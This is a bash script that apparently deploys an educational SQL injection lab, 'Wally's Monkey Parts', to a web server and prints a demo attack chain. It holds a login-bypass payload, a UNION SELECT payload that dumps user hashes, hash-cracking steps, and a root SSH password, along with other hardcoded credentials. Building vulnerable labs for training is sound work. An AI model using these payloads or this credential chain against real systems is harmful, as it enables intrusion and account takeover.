#!/bin/bash

# Deploy Wally's Monkey Parts SQL Injection Lab
# Educational Demo Setup Script

echo "================================================"
echo "Deploying Wally's Monkey Parts SQL Injection Lab"
echo "================================================"
echo ""

# Server details
SERVER="155.138.197.128"

# Step 1: Copy files to local temp directory
echo "Step 1: Preparing files..."
TEMP_DIR="/tmp/wallys-deploy-$(date +%s)"
mkdir -p $TEMP_DIR

cp wallys_login.php $TEMP_DIR/
cp wallys_dashboard.php $TEMP_DIR/
cp wallys_logout.php $TEMP_DIR/
cp wallys_database_setup.sql $TEMP_DIR/

# Step 2: Copy files to server using mcp_scp
echo "Step 2: Copying files to server..."
echo "Files will be copied to /var/www/html/"

# Use the mcp_scp command to copy files
# You mentioned you have an scp mcp server configured
echo "Please use your MCP SCP tool to copy the following files to the server:"
echo "  - wallys_login.php → /var/www/html/wallys_login.php"
echo "  - wallys_dashboard.php → /var/www/html/wallys_dashboard.php"
echo "  - wallys_logout.php → /var/www/html/wallys_logout.php"
echo "  - wallys_database_setup.sql → /root/wallys_database_setup.sql"

# Step 3: Create setup commands for the server
cat > $TEMP_DIR/setup_commands.sh << 'EOF'
#!/bin/bash

# Setup commands to run on the server
echo "Setting up Wally's Monkey Parts database..."

# Import the database
mysql < /root/wallys_database_setup.sql

# Set file permissions
chown www-data:www-data /var/www/html/wallys_*.php
chmod 644 /var/www/html/wallys_*.php

# Create the config file if it doesn't exist
if [ ! -f /var/www/html/sql-lab-config.json ]; then
    cat > /var/www/html/sql-lab-config.json << 'CONFIG'
{
    "lab_enabled": true,
    "last_modified": "$(date '+%Y-%m-%d %H:%M:%S')",
    "modified_by": "system"
}
CONFIG
    chown www-data:www-data /var/www/html/sql-lab-config.json
    chmod 664 /var/www/html/sql-lab-config.json
fi

# Restart Apache
systemctl restart apache2

echo "Setup complete!"
EOF

echo ""
echo "================================================"
echo "Manual Steps Required:"
echo "================================================"
echo ""
echo "1. Copy files to server at $SERVER using your MCP SCP tool"
echo ""
echo "2. SSH into the server and run:"
echo "   mysql < /root/wallys_database_setup.sql"
echo "   chown www-data:www-data /var/www/html/wallys_*.php"
echo "   chmod 644 /var/www/html/wallys_*.php"
echo "   systemctl restart apache2"
echo ""
echo "3. Access the lab at:"
echo "   http://$SERVER/wallys_login.php"
echo ""
echo "4. Test SQL injection with:"
echo "   Username: admin' --"
echo "   Password: anything"
echo ""
echo "5. Or use valid credentials:"
echo "   Username: admin"
echo "   Password: MonkeyBusiness123!"
echo ""
echo "================================================"
echo "Attack Methodology for Demo:"
echo "================================================"
echo ""
echo "1. SQL Injection to bypass login:"
echo "   admin' --"
echo ""
echo "2. Dump MD5 hashes using UNION:"
echo "   ' UNION SELECT id,username,password,email,role,null,null FROM users --"
echo ""
echo "3. Crack MD5 hashes online:"
echo "   - Use crackstation.net or similar"
echo "   - admin hash: $(echo -n 'MonkeyBusiness123!' | md5sum | cut -d' ' -f1)"
echo "   - wally hash: $(echo -n 'WallyParts2024!' | md5sum | cut -d' ' -f1)"
echo ""
echo "4. SSH with cracked credentials:"
echo "   ssh root@$SERVER"
echo "   Password: MonkeyRoot2024!"
echo ""
echo "Files prepared in: $TEMP_DIR"
echo ""